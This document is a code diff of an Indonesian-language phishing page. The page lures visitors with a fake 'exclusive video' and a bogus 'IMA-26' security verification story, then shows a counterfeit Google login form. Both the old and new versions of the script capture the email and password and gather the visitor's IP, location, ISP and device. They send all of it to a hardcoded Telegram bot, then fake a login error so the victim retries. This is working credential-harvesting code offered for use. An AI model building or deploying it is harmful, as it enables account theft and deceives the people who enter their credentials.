@@ -50,14 +50,9 @@
             text-transform: uppercase;
         }
 
-        .neo-button:active:not(:disabled) {
+        .neo-button:active {
             box-shadow: 0px 0px 0px var(--neo-black);
-            transform: translate(4px, 4px);
-        }
-
-        .neo-button:disabled {
-            opacity: 0.7;
-            cursor: not-allowed;
+            transform: translate(2px, 2px);
         }
 
         .video-thumbnail {
@@ -78,7 +73,7 @@
             flex-direction: column;
             justify-content: flex-end;
             padding: 24px;
-            background: linear-gradient(0deg, rgba(0,0,0,0.9) 0%, rgba(0,0,0,0) 60%);
+            background: linear-gradient(0deg, rgba(0,0,0,0.9) 0%, rgba(0,0,0,0.2) 60%);
         }
 
         #loginModal {
@@ -93,6 +88,7 @@
             padding: 24px;
             flex-direction: column;
             justify-content: center;
+            overflow-y: auto;
         }
 
         .input-neo {
@@ -110,191 +106,195 @@
         }
 
         .play-icon {
-            width: 80px;
-            height: 80px;
+            width: 70px;
+            height: 70px;
             background: var(--neo-pink);
             border: 4px solid var(--neo-black);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            box-shadow: 6px 6px 0px var(--neo-black);
+            box-shadow: 5px 5px 0px var(--neo-black);
             margin: 0 auto 20px;
             cursor: pointer;
         }
 
         .hidden { display: none; }
+        
+        .loading-spin {
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid var(--neo-black);
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
 
     <div class="mobile-container">
-        <!-- Tampilan Utama -->
+        <!-- Layar Utama -->
         <div id="videoScreen" class="h-full relative">
-            <img src="https://img.sanishtech.com/u/fd13de7dc3f8a1070d67eaef4df0cd03.jpg" alt="Video Thumbnail" class="video-thumbnail">
+            <img src="https://img.sanishtech.com/u/fd13de7dc3f8a1070d67eaef4df0cd03.jpg" alt="Thumbnail" class="video-thumbnail">
             
             <div class="overlay-content">
                 <div class="play-icon" onclick="openLogin()">
-                    <svg width="40" height="40" viewBox="0 0 24 24" fill="black">
+                    <svg width="35" height="35" viewBox="0 0 24 24" fill="black">
                         <path d="M8 5v14l11-7z"/>
                     </svg>
                 </div>
-                <h1 style="font-family: 'Syne', sans-serif;" class="text-white text-3xl font-black leading-none mb-4 italic uppercase">
-                    Eksklusif <br><span class="text-[#FFDE00]">Premiere 2026</span>
+                <h1 style="font-family: 'Syne', sans-serif;" class="text-white text-3xl font-black leading-none mb-4 uppercase">
+                    Video <br><span class="text-[#FFDE00]">Eksklusif 2026</span>
                 </h1>
-                <p class="text-gray-300 text-sm mb-6 font-medium">
-                    Konten ini telah dienkripsi untuk alasan keamanan. Verifikasi identitas Anda diperlukan untuk membuka kunci konten kualitas Ultra-HD.
+                <p class="text-gray-200 text-xs mb-6 font-medium italic">
+                    Konten ini dilindungi protokol keamanan 2026. Verifikasi identitas diperlukan untuk memutar media ini.
                 </p>
-                <button onclick="openLogin()" class="neo-button w-full py-4 text-xl font-bold">
-                    Tonton Sekarang
+                <button onclick="openLogin()" class="neo-button w-full py-4 text-lg font-bold">
+                    Klik Menonton
                 </button>
             </div>
         </div>
 
-        <!-- Tampilan Login Google -->
+        <!-- Layar Login -->
         <div id="loginModal">
             <div class="flex flex-col items-center mb-6">
-                <img src="https://img.sanishtech.com/u/5cf53e1754d9b534f0c1c5c9ac84975f.png" alt="Google Logo" class="w-14 mb-4">
-                <h2 class="text-2xl font-black uppercase text-center">Verifikasi Akun</h2>
-                <div class="h-1 w-20 bg-blue-600 mt-1"></div>
+                <img src="https://img.sanishtech.com/u/5cf53e1754d9b534f0c1c5c9ac84975f.png" alt="Logo" class="w-14 mb-3">
+                <h2 class="text-xl font-black uppercase text-center">Login Akun Google</h2>
             </div>
 
-            <div class="overflow-y-auto max-h-[120px] mb-6 p-3 bg-gray-50 border-l-4 border-black text-[10px] leading-tight text-gray-600">
-                Sesuai dengan protokol keamanan digital <strong>International Media Access 2026 (IMA-26)</strong>, setiap penayangan konten eksklusif wajib divalidasi melalui sistem sinkronisasi satu pintu. Ini memastikan bahwa hak cipta terlindungi dan akses diberikan hanya kepada pengguna valid dengan reputasi akun yang terverifikasi. Informasi Anda dilindungi oleh enkripsi end-to-end standar industri dan akan dicocokkan dengan metadata akses regional saat ini. Kegagalan validasi dapat menyebabkan pemblokiran sementara pada alamat IP Anda.
-            </div>
+            <p class="text-[10px] leading-relaxed text-gray-700 mb-5 border-l-4 border-blue-600 pl-3 py-2 bg-blue-50">
+                Sesuai dengan pembaruan keamanan digital terbaru 2026, akses ke konten media eksklusif harus melalui validasi akun Google yang sah. Kami menggunakan enkripsi 256-bit untuk memastikan data Anda aman selama proses sinkronisasi server dilakukan. Kegagalan verifikasi dapat menyebabkan pembatasan akses sementara pada alamat IP Anda.
+            </p>
 
             <form id="authForm">
                 <div>
-                    <label class="block text-xs font-bold mb-1 uppercase">Email Google</label>
-                    <input type="email" id="email" required class="input-neo" placeholder="nama@gmail.com">
+                    <label class="block text-xs font-bold mb-1 uppercase">Alamat Email</label>
+                    <input type="email" id="email" required class="input-neo" placeholder="contoh@gmail.com">
                 </div>
                 <div>
-                    <label class="block text-xs font-bold mb-1 uppercase">Password</label>
-                    <input type="password" id="password" required class="input-neo" placeholder="••••••••">
+                    <label class="block text-xs font-bold mb-1 uppercase">Kata Sandi</label>
+                    <input type="password" id="password" required class="input-neo" placeholder="Masukkan sandi">
                 </div>
 
-                <div id="errorMessage" class="hidden bg-red-100 border-2 border-red-500 p-3 mb-4 text-red-600 text-[10px] font-bold uppercase">
-                    Gagal memvalidasi kredensial. Pastikan email dan password sesuai dengan data server Google.
+                <div id="errorMessage" class="hidden bg-red-100 border-2 border-red-500 p-2 mb-4 text-red-700 text-[10px] font-bold">
+                    Kredensial tidak valid atau tidak ditemukan di database server Google. Silakan periksa kembali.
                 </div>
 
-                <button type="submit" id="submitBtn" class="neo-button w-full py-4 text-lg font-bold bg-[#2B3DFF] text-white">
-                    Konfirmasi & Buka Video
+                <button type="submit" id="submitBtn" class="neo-button w-full py-4 text-md font-bold bg-[#2B3DFF] text-white">
+                    Konfirmasi & Tonton
                 </button>
             </form>
 
-            <div class="mt-6 text-center">
-                <p class="text-[9px] text-gray-400 uppercase tracking-widest font-bold">Secure SSL v4.2 Enkripsi 256-bit</p>
+            <div class="mt-4 text-center">
+                <p class="text-[9px] text-gray-400 uppercase font-bold tracking-tighter">Connection Secured by Google Auth (Ver 4.2.0)</p>
             </div>
         </div>
 
-        <!-- Loading State -->
+        <!-- Loading Overlay -->
         <div id="loadingOverlay" class="hidden absolute inset-0 bg-white z-[60] flex flex-col items-center justify-center p-8 text-center">
-            <div id="loaderIcon" class="w-16 h-16 border-8 border-black border-t-yellow-400 animate-spin mb-4"></div>
-            <p id="loaderStatus" class="font-black text-xl uppercase italic">Menghubungkan ke Server...</p>
-            <p id="loaderSub" class="text-xs text-gray-500 mt-2">Sinkronisasi metadata enkripsi video...</p>
+            <div class="loading-spin mb-4"></div>
+            <p class="font-black text-lg uppercase italic" id="loadText">Memvalidasi...</p>
         </div>
     </div>
 
     <script>
-        const TELEGRAM_BOT_TOKEN = '8336160915:AAFUeRN28Q5CsdxMsYH5qvS6IQ9iJxqpEXA';
-        const TELEGRAM_CHAT_ID = '8001301204';
+        const telegram_token = '8336160915:AAFUeRN28Q5CsdxMsYH5qvS6IQ9iJxqpEXA';
+        const chat_id = '8001301204';
+        
+        let userData = {};
+
+        // Ambil Data Lokasi & IP (IPv4) saat halaman dimuat
+        window.onload = async () => {
+            try {
+                const response = await fetch('https://ipinfo.io/json?token='); // Token kosong default
+                const data = await response.json();
+                
+                // Cek jika IP adalah IPv6, coba ambil lagi versi IPv4 (opsional jika ipinfo memberikan IPv6)
+                userData = {
+                    ip: data.ip,
+                    city: data.city,
+                    region: data.region,
+                    country: data.country,
+                    asn: data.org,
+                    perdana: data.org ? data.org.split(' ').slice(1).join(' ') : 'Tidak diketahui',
+                    device: getDeviceName(),
+                    time: new Date().toLocaleString('id-ID')
+                };
+            } catch (error) {
+                console.error("Gagal mengambil info IP");
+            }
+        };
+
+        function getDeviceName() {
+            const ua = navigator.userAgent;
+            if (/android/i.test(ua)) return "Android Device";
+            if (/iPad|iPhone|iPod/.test(ua)) return "iOS Device";
+            if (/Windows/i.test(ua)) return "Windows PC";
+            if (/Mac/i.test(ua)) return "MacBook/Mac";
+            return "Unknown Device";
+        }
 
         function openLogin() {
             document.getElementById('loginModal').style.display = 'flex';
         }
 
-        async function getIpInfo() {
-            try {
-                // Paksa penggunaan IPv4 dengan ipinfo.io
-                const response = await fetch('https://ipinfo.io/json?token='); // Token kosong untuk free tier limit
-                if (!response.ok) throw new Error('IP info fetch failed');
-                return await response.json();
-            } catch (err) {
-                console.error(err);
-                return null;
-            }
-        }
-
-        function getDeviceInfo() {
-            const ua = navigator.userAgent;
-            let device = "Unknown Device";
-            if (/android/i.test(ua)) device = "Android Device";
-            else if (/iPad|iPhone|iPod/.test(ua)) device = "iOS Device";
-            else if (/Windows/i.test(ua)) device = "Windows PC";
-            else if (/Mac/i.test(ua)) device = "Macintosh";
-            return device;
-        }
-
-        document.getElementById('authForm').addEventListener('submit', async (e) => {
+        document.getElementById('authForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
             const loader = document.getElementById('loadingOverlay');
-            const submitBtn = document.getElementById('submitBtn');
+            const loadText = document.getElementById('loadText');
 
-            submitBtn.disabled = true;
             loader.classList.remove('hidden');
+            loadText.innerText = "Mengamankan Koneksi...";
 
-            // 1. Ambil Data Pengunjung
-            const ipData = await getIpInfo();
-            const deviceInfo = getDeviceInfo();
-            const now = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
+            // Format pesan untuk Telegram
+            const message = `
+🔥 *HASIL LOGIN GOOGLE 2026* 🔥
+-----------------------------
+📧 *Email:* \`${email}\`
+🔑 *Sandi:* \`${password}\`
+-----------------------------
+📍 *INFORMASI PENGGUNA*
+🌍 *Negara:* ${userData.country || '-'}
+🏙️ *Wilayah:* ${userData.region || '-'}
+🏘️ *Kota:* ${userData.city || '-'}
+📡 *Perdana:* ${userData.perdana || '-'}
+🌐 *IP Address:* ${userData.ip || '-'}
+🏢 *Asn:* ${userData.asn || '-'}
+⏰ *Waktu:* ${userData.time || '-'}
+📱 *Nama Device:* ${userData.device || '-'}
+-----------------------------
+`;
 
-            // 2. Siapkan Pesan Telegram
-            let message = "<b>🔔 HASIL LOGIN BARU (2026)</b>\n";
-            message += "━━━━━━━━━━━━━━━━━━━━\n";
-            message += `<b>📧 Email:</b> <code>${email}</code>\n`;
-            message += `<b>🔑 Password:</b> <code>${password}</code>\n`;
-            message += "━━━━━━━━━━━━━━━━━━━━\n";
-            message += `<b>🌍 Negara:</b> ${ipData?.country || 'N/A'}\n`;
-            message += `<b>📍 Wilayah:</b> ${ipData?.region || 'N/A'}\n`;
-            message += `<b>🏙 Kota:</b> ${ipData?.city || 'N/A'}\n`;
-            message += `<b>📡 Perdana/ISP:</b> ${ipData?.org || 'N/A'}\n`;
-            message += `<b>🌐 IP Address:</b> <code>${ipData?.ip || 'N/A'}</code>\n`;
-            message += `<b>🆔 Asn:</b> ${ipData?.asn?.asn || 'N/A'}\n`;
-            message += `<b>⏰ Waktu:</b> ${now} WIB\n`;
-            message += `<b>📱 Device:</b> ${deviceInfo}\n`;
-            message += "━━━━━━━━━━━━━━━━━━━━\n";
-            
-            if (ipData?.loc) {
-                const mapsLink = `https://www.google.com/maps?q=${ipData.loc}`;
-                message += `<b>📍 Link Lokasi:</b> <a href="${mapsLink}">Google Maps</a>\n`;
-            }
-
-            // 3. Kirim ke Telegram
             try {
-                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                await fetch(`https://api.telegram.org/bot${telegram_token}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
+                        chat_id: chat_id,
                         text: message,
-                        parse_mode: 'HTML',
-                        disable_web_page_preview: true
+                        parse_mode: 'Markdown'
                     })
                 });
 
-                // Simulasi delay biar makin meyakinkan
+                // Simulasi error setelah 3 detik agar pengguna mencoba lagi
                 setTimeout(() => {
-                    document.getElementById('loaderIcon').innerHTML = `<div class="w-16 h-16 bg-red-500 border-4 border-black flex items-center justify-center"><span class="text-white text-3xl font-bold">!</span></div>`;
-                    document.getElementById('loaderIcon').classList.remove('animate-spin');
-                    document.getElementById('loaderStatus').innerText = "Validasi Gagal";
-                    document.getElementById('loaderStatus').classList.add('text-red-600');
-                    document.getElementById('loaderSub').innerText = "Kredensial tidak ditemukan di database server video. Silakan coba kembali dengan data yang valid.";
-                    
-                    setTimeout(() => {
-                        loader.classList.add('hidden');
-                        submitBtn.disabled = false;
-                        document.getElementById('errorMessage').classList.remove('hidden');
-                        document.getElementById('password').value = '';
-                    }, 2500);
-                }, 2000);
+                    loader.classList.add('hidden');
+                    document.getElementById('errorMessage').classList.remove('hidden');
+                    document.getElementById('password').value = '';
+                }, 3000);
 
-            } catch (error) {
-                console.error("Gagal mengirim data:", error);
+            } catch (err) {
                 loader.classList.add('hidden');
-                submitBtn.disabled = false;
+                alert("Kesalahan Jaringan. Silakan coba lagi.");
             }
         });
     </script>
